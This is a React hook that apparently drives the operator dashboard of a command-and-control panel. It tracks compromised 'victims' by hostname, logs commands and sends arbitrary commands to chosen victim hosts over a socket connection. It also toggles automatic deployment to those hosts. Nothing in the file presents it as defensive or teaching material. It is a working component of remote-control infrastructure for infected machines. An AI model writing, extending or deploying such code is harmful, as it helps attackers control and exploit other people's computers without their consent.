import { useState, useEffect, useCallback, useRef } from 'react'
import { io } from 'socket.io-client'

export default function useSocket() {
  const [victims, setVictims] = useState({})
  const [logs, setLogs] = useState([])
  const [connected, setConnected] = useState(false)
  const [autoDeploy, setAutoDeploy] = useState({})
  const [stats, setStats] = useState({ victimCount: 0, logCount: 0 })
  const socketRef = useRef(null)

  useEffect(() => {
    const s = io({ transports: ['websocket', 'polling'] })

    s.on('connect', () => {
      setConnected(true)
    })

    s.on('disconnect', () => {
      setConnected(false)
    })

    s.on('dashboard_state', (data) => {
      setVictims(data.victims || {})
      setLogs(data.logs || [])
      const ad = {}
      for (const h of (data.auto_deploy_targets || [])) {
        ad[h] = true
      }
      setAutoDeploy(ad)
    })

    s.on('victim_update', (data) => {
      setVictims(prev => ({ ...prev, [data.hostname]: data.info }))
    })

    s.on('victim_removed', (data) => {
      setVictims(prev => {
        const next = { ...prev }
        delete next[data.hostname]
        return next
      })
    })

    s.on('command_log_update', (data) => {
      setLogs(prev => [data.entry, ...prev].slice(0, 100))
    })

    s.on('command_sent', () => {})

    s.on('auto_deploy_toggled', (data) => {
      if (data.error) return
      setAutoDeploy(prev => {
        const next = { ...prev }
        if (data.enabled) {
          next[data.hostname] = true
        } else {
          delete next[data.hostname]
        }
        return next
      })
    })

    socketRef.current = s
    return () => s.disconnect()
  }, [])

  useEffect(() => {
    setStats({
      victimCount: Object.keys(victims).length,
      logCount: logs.length,
    })
  }, [victims, logs])

  const sendCommand = useCallback((hostname, command, params = {}) => {
    if (socketRef.current) {
      socketRef.current.emit('send_command', { hostname, command, params })
    }
  }, [])

  const toggleAutoDeploy = useCallback((hostname, enabled) => {
    if (socketRef.current) {
      socketRef.current.emit('toggle_auto_deploy', { hostname, enabled })
    }
  }, [])

  return { victims, logs, connected, autoDeploy, stats, sendCommand, toggleAutoDeploy }
}
